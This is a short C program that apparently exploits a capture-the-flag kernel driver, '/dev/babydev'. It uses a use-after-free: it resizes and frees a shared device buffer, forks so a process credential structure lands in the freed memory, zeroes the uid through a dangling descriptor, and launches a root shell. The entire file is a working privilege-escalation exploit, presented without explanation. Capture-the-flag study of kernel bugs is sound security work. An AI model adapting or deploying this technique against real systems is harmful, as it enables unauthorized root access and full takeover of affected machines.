#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main(){
	
	int fd1 = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);

	ioctl(fd1, 0x10001, 0xa8);
	close(fd1);

	int pid = fork();

	if(pid<0){
		printf("ERROR FORKING!\n");
		return -1;
	}else if (pid == 0){
		char zeros[30] = {0};
		write(fd2, zeros, 28);

		if(getuid() == 0){
			printf("I'm ROOT NOW!\n");
			system("/bin/sh");
			return -1;
		
		}

	
	
	}else{
		wait(NULL);
	
	}
	
	close(fd2);

	return 0;
}
